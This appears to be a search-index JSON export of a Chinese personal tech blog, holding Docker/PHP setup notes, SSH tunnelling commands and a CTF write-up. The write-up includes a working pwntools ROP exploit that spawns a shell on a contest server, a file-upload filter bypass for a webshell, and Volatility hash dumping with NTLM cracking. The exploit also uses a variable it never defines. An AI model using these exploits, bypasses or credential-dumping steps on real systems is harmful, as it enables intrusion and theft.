{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to hkkblog","title":"Welcome to hkkblog"},{"location":"#welcome-to-hkkblog","text":"","title":"Welcome to hkkblog"},{"location":"docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/","text":"docker\u548cphpstorm\u642d\u5efaphp\u5f00\u53d1\u73af\u5883 \u9996\u5148docker-compose\u542f\u52a8php5.6\u3001php7.4\u3001mysql5.6\u4e09\u4e2a\u5bb9\u5668\uff0c\u5e76\u5efa\u7acb\u8fde\u63a5 version: '3' services: php5.6: image: php:5.6-apache ports: - 8000:80 volumes: [localfile:/var/www/html] links: - mysql stdin_open: true tty: true php7.4: image: php:7.4-apache ports: - 80:80 volumes: [localfile:/var/www/html] links: - mysql stdin_open: true tty: true mysql: image: mysql:5.6 environment: MYSQL_ROOT_PASSWORD: \"313807\" ports: - 3306:3306 \u670d\u52a1\u8d77\u6765\u540e \u8fdb\u5165php5.6\u4e0ephp7.4\u5bb9\u5668\u66f4\u65b0\u5e76\u5b89\u88c5vim apt update apt install vim \u5c06php-ini-production\u590d\u5236\u5230php.ini cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini docker\u4e2d\u5b89\u88c5php\u6269\u5c55\u4f7f\u7528\u547d\u4ee4 docker-php-ext-install php\u542f\u52a8\u6269\u5c55 docker-php-ext-enable \u5b89\u88c5mysql\u4e0emysqli\u6269\u5c55 docker-php-ext-install mysql docker-php-ext-install mysqli \u5b89\u88c5xdebug\u6269\u5c55 pecl install xdebug pecl install xdebug-2.5.0(5.6\u9700\u5b89\u88c5\u6b64\u7248\u672c) \u542f\u52a8php\u6269\u5c55 docker-php-ext-enable mysql docker-php-ext-enable mysqli docker-php-ext-enable xdebug \u914d\u7f6ephp.ini echo -e 'xdebug.remote_enable=On xdebug.remote_host= [remote_ip] xdebug.remote_port=9000 xdebug.auto_trace=On xdebug.collect_vars=On xdebug.collect_return=On xdebug.collect_params=On xdebug.idekey=phpstorm xdebug.remote_log=\"/tmp/xdebug.log\"' >> /usr/local/etc/php/php.ini \u5c06remote_ip\u66ff\u6362\u4e3a\u8fdc\u7a0bip php5.6\u7531\u4e8emysql\uff0cmysqli\u7684\u6269\u5c55\u4e3a.so\u6587\u4ef6\uff0c\u800cphp.ini\u4e2d\u4e3a.dll\u6240\u4ee5\u9700\u8981\u66f4\u6539php.ini extension=mysql.so extension=mysqli.so php7.4\u53ea\u9700\u5220\u9664extension\u524d ; \u5373\u53ef \u4ee5\u4e0a\u6b65\u9aa4\u5b8c\u5168\u53ef\u4ee5\u901a\u8fc7docker-compose\u4e0eDockerfile\u5b9e\u73b0\uff0c\u51fa\u4e8e\u61d2 \u5495\u5495\u5495\ud83d\udd4a","title":"docker\u548cphpstorm\u642d\u5efaphp\u5f00\u53d1\u73af\u5883"},{"location":"docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#dockerphpstormphp","text":"\u9996\u5148docker-compose\u542f\u52a8php5.6\u3001php7.4\u3001mysql5.6\u4e09\u4e2a\u5bb9\u5668\uff0c\u5e76\u5efa\u7acb\u8fde\u63a5 version: '3' services: php5.6: image: php:5.6-apache ports: - 8000:80 volumes: [localfile:/var/www/html] links: - mysql stdin_open: true tty: true php7.4: image: php:7.4-apache ports: - 80:80 volumes: [localfile:/var/www/html] links: - mysql stdin_open: true tty: true mysql: image: mysql:5.6 environment: MYSQL_ROOT_PASSWORD: \"313807\" ports: - 3306:3306 \u670d\u52a1\u8d77\u6765\u540e \u8fdb\u5165php5.6\u4e0ephp7.4\u5bb9\u5668\u66f4\u65b0\u5e76\u5b89\u88c5vim apt update apt install vim \u5c06php-ini-production\u590d\u5236\u5230php.ini cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini docker\u4e2d\u5b89\u88c5php\u6269\u5c55\u4f7f\u7528\u547d\u4ee4 docker-php-ext-install php\u542f\u52a8\u6269\u5c55 docker-php-ext-enable \u5b89\u88c5mysql\u4e0emysqli\u6269\u5c55 docker-php-ext-install mysql docker-php-ext-install mysqli \u5b89\u88c5xdebug\u6269\u5c55 pecl install xdebug pecl install xdebug-2.5.0(5.6\u9700\u5b89\u88c5\u6b64\u7248\u672c) \u542f\u52a8php\u6269\u5c55 docker-php-ext-enable mysql docker-php-ext-enable mysqli docker-php-ext-enable xdebug \u914d\u7f6ephp.ini echo -e 'xdebug.remote_enable=On xdebug.remote_host= [remote_ip] xdebug.remote_port=9000 xdebug.auto_trace=On xdebug.collect_vars=On xdebug.collect_return=On xdebug.collect_params=On xdebug.idekey=phpstorm xdebug.remote_log=\"/tmp/xdebug.log\"' >> /usr/local/etc/php/php.ini \u5c06remote_ip\u66ff\u6362\u4e3a\u8fdc\u7a0bip php5.6\u7531\u4e8emysql\uff0cmysqli\u7684\u6269\u5c55\u4e3a.so\u6587\u4ef6\uff0c\u800cphp.ini\u4e2d\u4e3a.dll\u6240\u4ee5\u9700\u8981\u66f4\u6539php.ini extension=mysql.so extension=mysqli.so php7.4\u53ea\u9700\u5220\u9664extension\u524d ; \u5373\u53ef \u4ee5\u4e0a\u6b65\u9aa4\u5b8c\u5168\u53ef\u4ee5\u901a\u8fc7docker-compose\u4e0eDockerfile\u5b9e\u73b0\uff0c\u51fa\u4e8e\u61d2 \u5495\u5495\u5495\ud83d\udd4a","title":"docker\u548cphpstorm\u642d\u5efaphp\u5f00\u53d1\u73af\u5883"},{"location":"ssh%E9%9A%A7%E9%81%93/","text":"ssh\u96a7\u9053 ssh\u96a7\u9053\u5e38\u7528\u53c2\u6570 -C\uff1a\u538b\u7f29\u4f20\u8f93\uff0c\u63d0\u9ad8\u4f20\u8f93\u901f\u5ea6 -f \uff1a\u5c06ssh\u4f20\u8f93\u8f6c\u5165\u540e\u53f0\u6267\u884c\uff0c\u4e0d\u5360\u7528\u5f53\u524d\u7684shell\u3002 -N\uff1a\u5efa\u7acb\u9759\u9ed8\u8fde\u63a5\uff08\u5efa\u7acb\u4e86\u8fde\u63a5\uff0c\u4f46\u662f\u770b\u4e0d\u5230\u5177\u4f53\u7684\u4f1a\u8bdd\uff09 -g \u5141\u8bb8\u8fdc\u7a0b\u4e3b\u673a\u8fde\u63a5\u672c\u5730\u7528\u4e8e\u8f6c\u53d1\u7684\u7aef\u53e3 -L\uff1a\u672c\u5730\u7aef\u53e3\u8f6c\u53d1 -R\uff1a\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1 -D\uff1a\u52a8\u6001\u8f6c\u53d1\uff08socks\u4ee3\u7406\uff09 -P\uff1a\u6307\u5b9assh\u7aef\u53e3 \u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1 ssh -NfR remote-ip:remote-port:localhost:local-port root@remoteip \u8fdc\u7a0bsshd_config\u9700\u8981\u8bbe\u7f6e AllowTcpForwarding yes GatewayPorts yes socks\u4ee3\u7406 ssh -NfD [localhost]:port root@localhost \u5148\u5728\u672c\u5730\u5b9e\u73b0socks\u4ee3\u7406\uff0c\u518d\u5c06socks\u4ee3\u7406\u7aef\u53e3\u901a\u8fc7\u96a7\u9053\u8fde\u63a5\u5230\u516c\u7f51 ssh -NfR remote-ip:remote-port:localhost:socks-port root@remoteip","title":"ssh\u96a7\u9053"},{"location":"ssh%E9%9A%A7%E9%81%93/#ssh","text":"ssh\u96a7\u9053\u5e38\u7528\u53c2\u6570 -C\uff1a\u538b\u7f29\u4f20\u8f93\uff0c\u63d0\u9ad8\u4f20\u8f93\u901f\u5ea6 -f \uff1a\u5c06ssh\u4f20\u8f93\u8f6c\u5165\u540e\u53f0\u6267\u884c\uff0c\u4e0d\u5360\u7528\u5f53\u524d\u7684shell\u3002 -N\uff1a\u5efa\u7acb\u9759\u9ed8\u8fde\u63a5\uff08\u5efa\u7acb\u4e86\u8fde\u63a5\uff0c\u4f46\u662f\u770b\u4e0d\u5230\u5177\u4f53\u7684\u4f1a\u8bdd\uff09 -g \u5141\u8bb8\u8fdc\u7a0b\u4e3b\u673a\u8fde\u63a5\u672c\u5730\u7528\u4e8e\u8f6c\u53d1\u7684\u7aef\u53e3 -L\uff1a\u672c\u5730\u7aef\u53e3\u8f6c\u53d1 -R\uff1a\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1 -D\uff1a\u52a8\u6001\u8f6c\u53d1\uff08socks\u4ee3\u7406\uff09 -P\uff1a\u6307\u5b9assh\u7aef\u53e3","title":"ssh\u96a7\u9053"},{"location":"ssh%E9%9A%A7%E9%81%93/#_1","text":"ssh -NfR remote-ip:remote-port:localhost:local-port root@remoteip \u8fdc\u7a0bsshd_config\u9700\u8981\u8bbe\u7f6e AllowTcpForwarding yes GatewayPorts yes","title":"\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1"},{"location":"ssh%E9%9A%A7%E9%81%93/#socks","text":"ssh -NfD [localhost]:port root@localhost \u5148\u5728\u672c\u5730\u5b9e\u73b0socks\u4ee3\u7406\uff0c\u518d\u5c06socks\u4ee3\u7406\u7aef\u53e3\u901a\u8fc7\u96a7\u9053\u8fde\u63a5\u5230\u516c\u7f51 ssh -NfR remote-ip:remote-port:localhost:socks-port root@remoteip","title":"socks\u4ee3\u7406"},{"location":"%E5%8F%91%E8%B4%A2writeup/","text":"HXB writeup WEB \u9898\u76ee\u540d\u5b57\u4e0d\u91cd\u8981\u53cd\u6b63\u9898\u633a\u7b80\u5355\u7684 \u76f4\u63a5\u4f20\u53c2file=phpinfo\uff0cflag\u88ab\u5199\u5230\u73af\u5883\u53d8\u91cf NewWebsite \u626b\u63cf\u76ee\u5f55\u626b\u5230/admin \u8bbf\u95ee\u540e\u5f31\u5bc6\u7801admin/admin\u767b\u5f55 \u53d1\u73b0\u6709?r=manageinfo\u9875\u9762\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u6587\u4ef6\u540d\u88ab\u9650\u5236\uff0c\u4f20php3\u5373\u53ef\u7ed5\u8fc7\uff0c\u7136\u540eantsword\u8fde\u63a5 CPYPTO \u53e4\u5178\u7f8e++ \u9898\u76ee\u8bf4\u662f\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff0c\u76f4\u63a5\u7206\u7834\u5bc6\u94a5\u5373\u53ef pwn pwn_printf \u6808\u6ea2\u51fa\uff0c\u901a\u8fc7puts\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff0c\u8ba1\u7b97\u504f\u79fb\u91cf\u5f97\u5230system\u51fd\u6570\u5730\u5740\u6765get shell exp\u5982\u4e0b\uff1a from pwn import * context.log_level = 'debug' p = remote('47.111.104.169',56706) elf = ELF('./pwn_printf') puts_plt = elf.symbols['puts'] puts_got = elf.got['puts'] pop_rdi_ret = 0x0000000000401213 pop_rsi_ret = 0x000401211 ret_addr = 0x4007C6 scanf = 0x004006A0 p.recvuntil(\"interesting\") for i in range(16): p.sendline(\"32\") payload1 = 'a'*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(0x40) + p64(ret_addr) p.sendline(payload1) p.recvline() puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) print (hex(puts_addr)) payload2 = 'a'*0x8 + p64(pop_rdi_ret) + p64(0x0401D99) +p64(pop_rsi_ret) +p64(0x06030A0)+p64(0)+ p64(scanf) + p64(pop_rdi_ret) + p64(0x20)+ p64(ret_addr+1) p.recv() str1 = int(b'/bin'[::-1].encode('hex'),16) str2 = int(b'/sh\\x00'[::-1].encode('hex'),16) p.sendline(payload2) sleep(0.5) p.sendline(str(str2)) sleep(0.5) payload3 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(0x06030A4) + p64(0) + p64(scanf) + p64(ret_addr) p.send(payload3) p.sendline(str(n2)) payload4 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x06030A0) + p64(puts_addr-0x2a300) sleep(0.5) p.sendline(payload4) p.interactive() MISC \u989c\u6587\u5b57\u4e4b\u8c1c \u901a\u8fc7\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u5bfc\u51faindex-demo.html \u5728\u6e90\u7801\u4e2d\u53d1\u73b0\u989c\u6587\u5b57 \u5206\u6790\u6d41\u91cf\u5305\uff0c\u5bfc\u51faindex\u6587\u4ef6\uff0c\u53d1\u73b0\u5b58\u5728\u591a\u4f59\u7684\u957f\u77ed\u4e0d\u4e00\u7684\u7a7a\u683c\u548cbase64\u52a0\u5bc6\u8fc7\u7684\u989c\u6587\u5b57\uff0c\u611f\u89c9\u6709\u9690\u5199 \u7528stegsnow\u770b\u4e00\u4e0b \u90a3\u4e48\u5c1d\u8bd5\u628a\u6587\u4ef6\u91cc\u9762\u9690\u85cf\u7684base64\u90e8\u5206\u5229\u7528\u8d77\u6765 \u7f51\u4e0a\u627e\u4e2abase64\u9690\u5199\u811a\u672c b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' with open('C:/Users/kai/Desktop/base.txt', 'rb') as f: bin_str = '' for line in f.readlines(): stegb64 = ''.join(line.split()) rowb64 = ''.join(stegb64.decode('base64').encode('base64').split()) offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1])) equalnum = stegb64.count('=') #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) \u7ed3\u679c\u662fkey:\"lorrie\" \u89e3\u7801\u770b\u770b flag\u5934\u548c\u5c3e\u662f\u5bf9\u7684\uff0c\u4e71\u7801\u611f\u89c9\u50cf\u662f\u7f16\u7801\u95ee\u9898\uff0c\u6211\u4eec\u628a\u5b83\u5bfc\u51fa\u4e3a16\u8fdb\u5236\u8bd5\u8bd5 a=`stegsnow -p \"lorrie\" index-demo.html ` echo $a | perl -ne 'printf\"%x\", ord for split //' \u5f97\u5230\u7684\u7ed3\u679c\u653e\u6587\u4ef6\u91cc\uff0c\u518d\u7528010\u5bfc\u5165\u770b\u770b \u9ed8\u8ba4\u7684ascii\u7f16\u7801\u4e0b\u4f9d\u65e7\u662f\u4e71\u7801 \u6211\u4eec\u5728 view -> character setting \u91cc\u9762\u628a\u7f16\u7801\u6362\u6210gbk\u6216\u8005utf\u8bd5\u8bd5 \u7136\u540e\u53d1\u73b0gbk\u4e0b\u7684\u7f16\u7801\u80fd\u663e\u793a\u6b63\u5e38\u7684\u5b57\u7b26\uff0c\u6211\u4eec\u590d\u5236\u5230txt\u91cc \u53d1\u73b0\u662f \u2190_\u2190 \u548c \u2192_\u2192 \u6784\u6210\u7684\u989c\u6587\u5b57 \u6709\u53ef\u80fd\u662f\u4e8c\u8fdb\u5236\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u6469\u65af\u7535\u7801 \u7ecf\u961f\u53cb\u63d0\u9192\uff0c\u5e94\u8be5\u662f\u56fd\u9645\u7535\u62a5\u7801 \u90a3\u6211\u4eec\u628a \u2192_\u2192 \u8f6c\u6210 - \uff0c\u628a \u2190_\u2190 \u8f6c\u6210 \u00b7 \uff0c\u62ff\u53bb\u89e3\u7801\u8bd5\u8bd5 \u6210\u529f\u62ff\u5230flag passwd \u662f\u4e00\u9053\u5185\u5b58\u53d6\u8bc1\u9898\uff0c\u9898\u76ee\u8981\u6c42\u6211\u4eec\u53bb\u62ff\u5230\u5f53\u524d\u7528\u6237\u7684\u5bc6\u7801 python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02::: \u6709\u4e2a\u53eb\u505aCTF\u7684\u8d26\u53f7\uff0c\u4f30\u8ba1\u5c31\u662f\u5f53\u524d\u7528\u6237\u4e86 CTF\u5bc6\u7801ntlm\u67e5\u8be2\u51fa\u6765\u662fqwer1234\uff0c\u7136\u540eMD5\u5c31\u662fflag \u865a\u5b9e\u4e4b\u95f4 \u770b\u4e0a\u53bb\u662f\u660e\u6587\u653b\u51fb\uff0c\u4f46\u662fflag.txt\u662f\u5f3a\u52a0\u5bc6\u7684\uff0c\u4f30\u8ba1\u660e\u6587\u653b\u51fb\u65e0\u6548 \u5e72\u8106\u5b57\u5178\u7206\u51fa\u538b\u7f29\u5305\u5bc6\u7801 123%asd!O \u7136\u540e\u6805\u680f\u5bc6\u7801\u89e3\u7801\u5f97\u5230flag \u9690\u85cf\u7684\u79d8\u5bc6 \u67e5\u770b\u8fdb\u7a0b\uff0c\u53d1\u73b0notepad.exe\uff0cpid\u4e3a2440\uff0c\u4e0d\u8fc7\u5185\u5bb9\u662f\u4e71\u7801\u7684\uff0c\u4f30\u8ba1\u5b58\u5728\u7f16\u7801\u95ee\u9898\uff0c\u90a3\u6211\u4eec\u5e72\u8106\u628a\u8fdb\u7a0b\u5bfc\u51fa python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 memdump -p 2440 -D ./my_mem/out/hxb \u7528diskgenius\u6253\u5f00\u5bfc\u51fa\u7684dmp\u6587\u4ef6\u53ef\u4ee5\u770b\u5230 python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K \"SAM\\Domains\\Account\\Users\\Names\" \u4e8e\u662f\u5bfc\u51fa\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6279\u91cf\u89e3NTLM\uff0c\u6700\u540e\u5c1d\u8bd5\u5bc6\u7801\u4e3a NIAIWOMA \u7684\u8d26\u6237\u548c\u5bc6\u7801MD5 \u662fflag \u518d\u770b\u4e00\u4e0b\u65e5\u5fd7 python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 evtlogs -D ./my_mem/out/hxb python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 timeliner > ./my_mem/out/hxb \u53d1\u73b0\u8fd9\u4e2a\u7535\u8111\u6743\u9650\u90fd\u662f\u5199\u5728\u7528\u6237\u7ec4\u91cc\u9762\u7684\uff0c\u5e38\u89c4\u7528\u6237\u5e94\u8be5\u90fd\u662f S-1-5-18 \u8fd9\u4e2a\u7528\u6237\u7ec4\u7684 \u4f46\u662f\u770b\u4e0d\u5230\u5177\u4f53\u662f\u54ea\u4e9b\u7528\u6237\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u662f\u6211\u592a\u83dc\u4e86 \u590d\u73b0\u7684\u65f6\u5019\u53d1\u73b0 SAM\\Domains\\Account\\Users\\Names \u8fd9\u4e2a\u6ce8\u518c\u8868\u76ee\u5f55\u4e0b\u5b58\u5728\u6240\u6709\u7528\u6237\uff0c\u67e5\u770b\u7528\u6237\u7684\u952e\u503c\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u6ce8\u518c\u8868\u6700\u540e\u4fee\u6539\u7684\u65f6\u95f4 \u67e5\u770b\u51e0\u4e2a\u7528\u6237\uff0c\u53d1\u73b0\u4ed6\u4eec\u7684\u4fee\u6539\u65f6\u95f4\u90fd\u5728 14:02 \u8fd9\u4e2a\u65f6\u95f4 \u800c\u6574\u4e2a\u8868\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\u662f\u5728 14:07 \u4e4b\u540e\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u628a 14:07 \u4fee\u6539\u6ce8\u518c\u8868\u7684\u7528\u6237\u627e\u51fa\u6765\u5c31\u884c\u4e86\uff0c\u6413\u4e2a\u811a\u672c # coding=utf-8 import os hide_mem = \"../my_mem/hide.vmem\" payload = 'python ../vol.py -f ../my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K \"SAM\\\\Domains\\\\Account\\\\Users\\\\Names\\\\{}\"' # print(payload) # list = os.system(\"ls ../my_mem/\") user_list = open(\"./user_list.txt\", \"r\").read().split() # print(user_list) # test = os.system(payload.format(user_list[0])) # print(payload.format(user_list[0])) # print(type(\"14:02:09\")) for i in user_list: test = os.popen(payload.format(i)).readlines() output = \"\".join(test) # print(output) if \"14:02:09\" not in output: print(i) \u6587\u4ef6\u8def\u5f84\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u8fdb\u884c\u4fee\u6539 \u5341\u51e0\u5206\u949f\u5927\u6982\u53ef\u4ee5\u51fa\u6765 RE easy_c++ \u7b80\u5355\u5f02\u6216\u76f4\u63a5\u811a\u672c\u8dd1 a=\"7d21e<e3<:3;9;ji t r#w\\\"$*{*+*$|,\" b=\"\" for i in range(len(a)): b+=chr(ord(a[i])^i) print(b) easyre \u52a8\u6001\u8c03\u8bd5\uff0c\u4e00\u4f4d\u4e00\u4f4d\u7206\u51fa\u6765 ReMe import hashlib list = [ 'e5438e78ec1de10a2693f9cffb930d23', '08e8e8855af8ea652df54845d21b9d67', 'a905095f0d801abd5865d649a646b397', 'bac8510b0902185146c838cdf8ead8e0', 'f26f009a6dc171e0ca7a4a770fecd326', 'cffd0b9d37e7187483dc8dd19f4a8fa8', '4cb467175ab6763a9867b9ed694a2780', '8e50684ac9ef90dfdc6b2e75f2e23741', 'cffd0b9d37e7187483dc8dd19f4a8fa8', 'fd311e9877c3db59027597352999e91f', '49733de19d912d4ad559736b1ae418a7', '7fb523b42413495cc4e610456d1f1c84', '8e50684ac9ef90dfdc6b2e75f2e23741', 'acb465dc618e6754de2193bf0410aafe', 'bc52c927138231e29e0b05419e741902', '515b7eceeb8f22b53575afec4123e878', '451660d67c64da6de6fadc66079e1d8a', '8e50684ac9ef90dfdc6b2e75f2e23741', 'fe86104ce1853cb140b7ec0412d93837', 'acb465dc618e6754de2193bf0410aafe', 'c2bab7ea31577b955e2c2cac680fb2f4', '8e50684ac9ef90dfdc6b2e75f2e23741', 'f077b3a47c09b44d7077877a5aff3699', '620741f57e7fafe43216d6aa51666f1d', '9e3b206e50925792c3234036de6a25ab', '49733de19d912d4ad559736b1ae418a7', '874992ac91866ce1430687aa9f7121fc' ] def decode(n): result = [] while n != 1: if n%2: n=n*3+1 else: n=n//2 result.append(n) return result if __name__ == \"__main__\": for i in range(33,128): result = decode(i) string = '' for x in range(len(result)): string += str(result[x]) string += str(result[(len(result) - x - 1)]) md5 = hashlib.md5() md5.update(string.encode()) md5 = md5.hexdigest() for line in range(27): if md5 == list[line]: print line,'->',chr(i) \u7136\u540e\u6309\u987a\u5e8f\u6392\u5e8fMD5\u5373\u53ef","title":"HXB writeup"},{"location":"%E5%8F%91%E8%B4%A2writeup/#hxb-writeup","text":"","title":"HXB writeup"},{"location":"%E5%8F%91%E8%B4%A2writeup/#web","text":"","title":"WEB"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_1","text":"\u76f4\u63a5\u4f20\u53c2file=phpinfo\uff0cflag\u88ab\u5199\u5230\u73af\u5883\u53d8\u91cf","title":"\u9898\u76ee\u540d\u5b57\u4e0d\u91cd\u8981\u53cd\u6b63\u9898\u633a\u7b80\u5355\u7684"},{"location":"%E5%8F%91%E8%B4%A2writeup/#newwebsite","text":"\u626b\u63cf\u76ee\u5f55\u626b\u5230/admin \u8bbf\u95ee\u540e\u5f31\u5bc6\u7801admin/admin\u767b\u5f55 \u53d1\u73b0\u6709?r=manageinfo\u9875\u9762\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u6587\u4ef6\u540d\u88ab\u9650\u5236\uff0c\u4f20php3\u5373\u53ef\u7ed5\u8fc7\uff0c\u7136\u540eantsword\u8fde\u63a5","title":"NewWebsite"},{"location":"%E5%8F%91%E8%B4%A2writeup/#cpypto","text":"","title":"CPYPTO"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_2","text":"\u9898\u76ee\u8bf4\u662f\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff0c\u76f4\u63a5\u7206\u7834\u5bc6\u94a5\u5373\u53ef","title":"\u53e4\u5178\u7f8e++"},{"location":"%E5%8F%91%E8%B4%A2writeup/#pwn","text":"","title":"pwn"},{"location":"%E5%8F%91%E8%B4%A2writeup/#pwn_printf","text":"\u6808\u6ea2\u51fa\uff0c\u901a\u8fc7puts\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff0c\u8ba1\u7b97\u504f\u79fb\u91cf\u5f97\u5230system\u51fd\u6570\u5730\u5740\u6765get shell exp\u5982\u4e0b\uff1a from pwn import * context.log_level = 'debug' p = remote('47.111.104.169',56706) elf = ELF('./pwn_printf') puts_plt = elf.symbols['puts'] puts_got = elf.got['puts'] pop_rdi_ret = 0x0000000000401213 pop_rsi_ret = 0x000401211 ret_addr = 0x4007C6 scanf = 0x004006A0 p.recvuntil(\"interesting\") for i in range(16): p.sendline(\"32\") payload1 = 'a'*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(0x40) + p64(ret_addr) p.sendline(payload1) p.recvline() puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) print (hex(puts_addr)) payload2 = 'a'*0x8 + p64(pop_rdi_ret) + p64(0x0401D99) +p64(pop_rsi_ret) +p64(0x06030A0)+p64(0)+ p64(scanf) + p64(pop_rdi_ret) + p64(0x20)+ p64(ret_addr+1) p.recv() str1 = int(b'/bin'[::-1].encode('hex'),16) str2 = int(b'/sh\\x00'[::-1].encode('hex'),16) p.sendline(payload2) sleep(0.5) p.sendline(str(str2)) sleep(0.5) payload3 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(0x06030A4) + p64(0) + p64(scanf) + p64(ret_addr) p.send(payload3) p.sendline(str(n2)) payload4 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x06030A0) + p64(puts_addr-0x2a300) sleep(0.5) p.sendline(payload4) p.interactive()","title":"pwn_printf"},{"location":"%E5%8F%91%E8%B4%A2writeup/#misc","text":"","title":"MISC"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_3","text":"\u901a\u8fc7\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u5bfc\u51faindex-demo.html \u5728\u6e90\u7801\u4e2d\u53d1\u73b0\u989c\u6587\u5b57 \u5206\u6790\u6d41\u91cf\u5305\uff0c\u5bfc\u51faindex\u6587\u4ef6\uff0c\u53d1\u73b0\u5b58\u5728\u591a\u4f59\u7684\u957f\u77ed\u4e0d\u4e00\u7684\u7a7a\u683c\u548cbase64\u52a0\u5bc6\u8fc7\u7684\u989c\u6587\u5b57\uff0c\u611f\u89c9\u6709\u9690\u5199 \u7528stegsnow\u770b\u4e00\u4e0b \u90a3\u4e48\u5c1d\u8bd5\u628a\u6587\u4ef6\u91cc\u9762\u9690\u85cf\u7684base64\u90e8\u5206\u5229\u7528\u8d77\u6765 \u7f51\u4e0a\u627e\u4e2abase64\u9690\u5199\u811a\u672c b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' with open('C:/Users/kai/Desktop/base.txt', 'rb') as f: bin_str = '' for line in f.readlines(): stegb64 = ''.join(line.split()) rowb64 = ''.join(stegb64.decode('base64').encode('base64').split()) offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1])) equalnum = stegb64.count('=') #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) \u7ed3\u679c\u662fkey:\"lorrie\" \u89e3\u7801\u770b\u770b flag\u5934\u548c\u5c3e\u662f\u5bf9\u7684\uff0c\u4e71\u7801\u611f\u89c9\u50cf\u662f\u7f16\u7801\u95ee\u9898\uff0c\u6211\u4eec\u628a\u5b83\u5bfc\u51fa\u4e3a16\u8fdb\u5236\u8bd5\u8bd5 a=`stegsnow -p \"lorrie\" index-demo.html ` echo $a | perl -ne 'printf\"%x\", ord for split //' \u5f97\u5230\u7684\u7ed3\u679c\u653e\u6587\u4ef6\u91cc\uff0c\u518d\u7528010\u5bfc\u5165\u770b\u770b \u9ed8\u8ba4\u7684ascii\u7f16\u7801\u4e0b\u4f9d\u65e7\u662f\u4e71\u7801 \u6211\u4eec\u5728 view -> character setting \u91cc\u9762\u628a\u7f16\u7801\u6362\u6210gbk\u6216\u8005utf\u8bd5\u8bd5 \u7136\u540e\u53d1\u73b0gbk\u4e0b\u7684\u7f16\u7801\u80fd\u663e\u793a\u6b63\u5e38\u7684\u5b57\u7b26\uff0c\u6211\u4eec\u590d\u5236\u5230txt\u91cc \u53d1\u73b0\u662f \u2190_\u2190 \u548c \u2192_\u2192 \u6784\u6210\u7684\u989c\u6587\u5b57 \u6709\u53ef\u80fd\u662f\u4e8c\u8fdb\u5236\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u6469\u65af\u7535\u7801 \u7ecf\u961f\u53cb\u63d0\u9192\uff0c\u5e94\u8be5\u662f\u56fd\u9645\u7535\u62a5\u7801 \u90a3\u6211\u4eec\u628a \u2192_\u2192 \u8f6c\u6210 - \uff0c\u628a \u2190_\u2190 \u8f6c\u6210 \u00b7 \uff0c\u62ff\u53bb\u89e3\u7801\u8bd5\u8bd5 